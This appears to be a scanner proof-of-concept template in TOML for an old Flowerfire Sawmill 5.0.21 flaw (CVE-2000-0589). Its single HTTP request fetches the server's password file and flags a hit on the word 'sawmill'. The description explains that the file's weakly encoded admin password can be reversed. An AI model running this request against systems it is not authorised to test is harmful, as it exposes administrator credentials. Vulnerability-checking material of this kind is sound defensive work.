[info]
author = "ave"
description = "检测目标是否运行 Flowerfire Sawmill 5.0.21，并验证其密码文件是否存在且使用弱加密算法存储密码。攻击者可读取密码文件后利用公开的逆向映射算法还原管理员明文密码。"
id = "POC-AVE-2000-0468"
name = "Flowerfire Sawmill 5.0.21 弱密码加密漏洞 PoC"
severity = "high"
tags = ["ave-2000-0468"]
vuln_id = [
    "CVE-2000-0589",
    "AVE-2000-0468",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/sawmill/password"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["sawmill"]
